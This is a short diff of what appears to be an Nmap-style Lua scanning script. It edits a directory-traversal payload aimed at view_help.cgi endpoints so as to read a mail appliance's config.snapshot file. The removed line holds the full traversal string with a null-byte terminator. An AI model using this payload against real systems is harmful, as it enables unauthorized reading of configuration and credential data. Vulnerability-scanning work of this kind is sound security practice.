@@ -88,7 +88,7 @@ action = function(host, port)
 
   local result = {}
   local paths = {"/cgi-bin/view_help.cgi", "/cgi-mod/view_help.cgi"}
-  local payload = "?locale=/../../../../../../../mail/snapshot/config.snapshot%00"
+  local payload = "?locale=/../../../../../../.."
   local file = "/mail/snapshot/config.snapshot"
   local user_count = 0
   local config_file = ""
